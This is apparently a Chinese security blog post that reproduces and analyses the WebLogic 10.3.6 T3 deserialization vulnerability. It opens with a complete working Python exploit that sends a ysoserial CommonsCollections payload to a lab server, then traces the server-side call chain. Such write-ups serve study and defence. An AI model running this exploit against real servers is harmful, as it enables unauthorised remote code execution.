+<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/68204172a6fe9.png" alt="image-20250424173653693" srcset="https://bu.dusays.com/2025/05/11/68204172a6fe9.png?size=small, https://bu.dusays.com/2025/05/11/68204172a6fe9.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/68204172a6fe9.png?size=large 2x" data-title="image-20250424173653693" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h3 id="漏洞复现" class="heading-element"><span>漏洞复现</span>
+  <a href="#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>10.3.6 版本的 exp</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">popen</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span> <span class="c1"># 负责大小端的转换</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">stdout</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">binascii</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">generatePayload</span><span class="p">(</span><span class="n">gadget</span><span class="p">,</span><span class="n">cmd</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">YSO_PATH</span> <span class="o">=</span> <span class="sa">r</span><span class="s2">&#34;D:\14.Java\tools\windows_tools\windows_tools\ysoserial-all.jar&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">popen</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">([</span><span class="s1">&#39;java&#39;</span><span class="p">,</span><span class="s1">&#39;-jar&#39;</span><span class="p">,</span><span class="n">YSO_PATH</span><span class="p">,</span><span class="n">gadget</span><span class="p">,</span><span class="n">cmd</span><span class="p">],</span><span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">popen</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">T3Exploit</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="p">,</span><span class="n">payload</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sock</span> <span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">handshake</span> <span class="o">=</span> <span class="s2">&#34;t3 10.3.6</span><span class="se">\n</span><span class="s2">AS:255</span><span class="se">\n</span><span class="s2">HL:19</span><span class="se">\n</span><span class="s2">MS:10000000</span><span class="se">\n\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sock</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">handshake</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">compile</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="s2">&#34;HELO:(.*).0.false&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">match</span> <span class="o">=</span> <span class="nb">compile</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="k">match</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Weblogic: &#34;</span><span class="o">+</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="k">match</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Not Weblogic&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">#return</span>
+</span></span><span class="line"><span class="cl">    <span class="n">header</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">a2b_hex</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;00000000&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">t3header</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">a2b_hex</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">desflag</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">a2b_hex</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;fe010000&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="n">header</span> <span class="o">+</span> <span class="n">t3header</span>  <span class="o">+</span><span class="n">desflag</span><span class="o">+</span>  <span class="n">payload</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&#34;&gt;I&#34;</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span> <span class="o">+</span> <span class="n">payload</span><span class="p">[</span><span class="mi">4</span><span class="p">:]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ip</span> <span class="o">=</span> <span class="s2">&#34;192.168.2.128&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">port</span> <span class="o">=</span> <span class="mi">7001</span>
+</span></span><span class="line"><span class="cl">    <span class="n">gadget</span> <span class="o">=</span> <span class="s2">&#34;CommonsCollections1&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;touch /tmp/success_test&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="n">generatePayload</span><span class="p">(</span><span class="n">gadget</span><span class="p">,</span><span class="n">cmd</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">T3Exploit</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/6820417258a82.png" alt="image-20250424181926433" srcset="https://bu.dusays.com/2025/05/11/6820417258a82.png?size=small, https://bu.dusays.com/2025/05/11/6820417258a82.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/6820417258a82.png?size=large 2x" data-title="image-20250424181926433" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>只试了下 cc 链，1、3、6、7都能打通</p>
+<h4 id="weblogic请求分析" class="heading-element"><span>WebLogic请求分析</span>
+  <a href="#weblogic%e8%af%b7%e6%b1%82%e5%88%86%e6%9e%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>本地拿wireshark抓个回环包，借用下佬的图</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/682041729a61f.png" alt="image-20250424182715727" srcset="https://bu.dusays.com/2025/05/11/682041729a61f.png?size=small, https://bu.dusays.com/2025/05/11/682041729a61f.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/682041729a61f.png?size=large 2x" data-title="image-20250424182715727" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>第一部分是请求包头，第二部分是服务端的响应，第三部分是请求主体</p>
+<p>可以看到服务端的响应，在得到了正确的请求头后，Weblogic会返回一个包含版本号的信息</p>
+<p>在反序列化数据包中，<code>ac ed 00 05</code> 是反序列化标志，在 T3 协议中由于每个反序列化数据包前面都有 <code>fe 01 00 00</code> ，所以这里反序列化的标志就相当于是 <code>fe 01 00 00 ac ed 00 05</code></p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/682041756a6e1.png" alt="image-20250424182934350" srcset="https://bu.dusays.com/2025/05/11/682041756a6e1.png?size=small, https://bu.dusays.com/2025/05/11/682041756a6e1.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/682041756a6e1.png?size=large 2x" data-title="image-20250424182934350" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>整个请求主体包含了6个部分的序列化数据，我们可以对其中任意一个部分进行攻击</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/68204172833a4.png" alt="image-20250424183007025" srcset="https://bu.dusays.com/2025/05/11/68204172833a4.png?size=small, https://bu.dusays.com/2025/05/11/68204172833a4.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/68204172833a4.png?size=large 2x" data-title="image-20250424183007025" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h3 id="漏洞分析" class="heading-element"><span>漏洞分析</span>
+  <a href="#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>入口类是 <code>weblogic.rjvm.InboundMsgAbbrev</code> ，关注到其 <code>readObject</code> 方法</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">readObject</span><span class="p">(</span><span class="n">MsgAbbrevInputStream</span><span class="w"> </span><span class="n">var1</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">var2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var1</span><span class="p">.</span><span class="na">read</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">switch</span><span class="w"> </span><span class="p">(</span><span class="n">var2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="n">0</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">ServerChannelInputStream</span><span class="p">(</span><span class="n">var1</span><span class="p">)).</span><span class="na">readObject</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="n">1</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="n">var1</span><span class="p">.</span><span class="na">readASCII</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">default</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">StreamCorruptedException</span><span class="p">(</span><span class="s">&#34;Unknown typecode: &#39;&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">var2</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;&#39;&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到这里 var1 的 head 的值就是我们传入的序列化的数据</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/682041758b5bd.png" alt="image-20250424183934508" srcset="https://bu.dusays.com/2025/05/11/682041758b5bd.png?size=small, https://bu.dusays.com/2025/05/11/682041758b5bd.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/682041758b5bd.png?size=large 2x" data-title="image-20250424183934508" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>然后进入 <code>ServerChannelInputStream</code> 构造函数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w">        </span><span class="kd">private</span><span class="w"> </span><span class="nf">ServerChannelInputStream</span><span class="p">(</span><span class="n">MsgAbbrevInputStream</span><span class="w"> </span><span class="n">var1</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kd">super</span><span class="p">(</span><span class="n">var1</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">this</span><span class="p">.</span><span class="na">serverChannel</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var1</span><span class="p">.</span><span class="na">getServerChannel</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里 var1 是个 MsgAbbrevInputStream 对象，这个类在 Weblogic 中实现的一个 Java 输入流类，用于接收消息并将其转换为 Java 对象， super 方法跟进去没啥东西，继续跟进 <code>getServerChannel</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">ServerChannel</span><span class="w"> </span><span class="nf">getServerChannel</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">connection</span><span class="p">.</span><span class="na">getChannel</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>this.connection</code> 中存储了一些连接信息，包括IP，端口等，跟进 <code>getChannel</code> 方法</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">ServerChannel</span><span class="w"> </span><span class="nf">getChannel</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">MuxableSocketT3</span><span class="p">.</span><span class="na">this</span><span class="p">.</span><span class="na">getChannel</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>继续跟进，会调用到 <code>BaseAbstractMuxableSocket</code> 的 <code>getChannel</code> 方法</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">ServerChannel</span><span class="w"> </span><span class="nf">getChannel</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">channel</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/6820417280443.png" alt="image-20250424185722905" srcset="https://bu.dusays.com/2025/05/11/6820417280443.png?size=small, https://bu.dusays.com/2025/05/11/6820417280443.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/6820417280443.png?size=large 2x" data-title="image-20250424185722905" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>处理完后回到 <code>InboundMsgAbbrev#readObject</code> 处，<code>ServerChannelInputStream</code> 继承了 <code>ObjectInputStream</code> 类，调用其 <code>readObject</code> 方法</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/682041729725e.png" alt="image-20250424221554617" srcset="https://bu.dusays.com/2025/05/11/682041729725e.png?size=small, https://bu.dusays.com/2025/05/11/682041729725e.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/682041729725e.png?size=large 2x" data-title="image-20250424221554617" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>之后跟进后会调用到 <code>InboundMsgAbbrev#resolveClass</code> ，这其中的调用链</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">resolveClass:108, InboundMsgAbbrev$ServerChannelInputStream (weblogic.rjvm)
+</span></span><span class="line"><span class="cl">readNonProxyDesc:1610, ObjectInputStream (java.io)
+</span></span><span class="line"><span class="cl">readClassDesc:1515, ObjectInputStream (java.io)
+</span></span><span class="line"><span class="cl">readOrdinaryObject:1769, ObjectInputStream (java.io)
+</span></span><span class="line"><span class="cl">readObject0:1348, ObjectInputStream (java.io)
+</span></span><span class="line"><span class="cl">readObject:370, ObjectInputStream (java.io)
+</span></span><span class="line"><span class="cl">readObject:66, InboundMsgAbbrev (weblogic.rjvm)</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里的 var1 就是 <code>sun.reflect.annotation.AnnotationInvocationHandler</code> 类</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/68204175c1066.png" alt="image-20250424222344429" srcset="https://bu.dusays.com/2025/05/11/68204175c1066.png?size=small, https://bu.dusays.com/2025/05/11/68204175c1066.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/68204175c1066.png?size=large 2x" data-title="image-20250424222344429" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>再然后就会调用到 <code>AnnotationInvocationHandler#readObject</code> 了，之后就是 cc1 了</p>
+<p>分析完调用流程后我们再回过头来看到poc</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl">    <span class="n">header</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">a2b_hex</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;00000000&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">t3header</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">a2b_hex</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">desflag</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">a2b_hex</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;fe010000&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="n">header</span> <span class="o">+</span> <span class="n">t3header</span>  <span class="o">+</span><span class="n">desflag</span><span class="o">+</span>  <span class="n">payload</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&#34;&gt;I&#34;</span><span class="p">,</span><span class="n">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span> <span class="o">+</span> <span class="n">payload</span><span class="p">[</span><span class="mi">4</span><span class="p">:]</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里 header 表示数据包的长度，最开始只用于占位，可以看到最后生成 payload 时将其覆盖了，t3header 是 T3 协议的协议头，最后 desflag 就是反序列化标识，但在之前的分析中我们看到是8个字节，这里却只有4个字节，这是因为 yso 生成的 payload 会补全后四个字节</p>
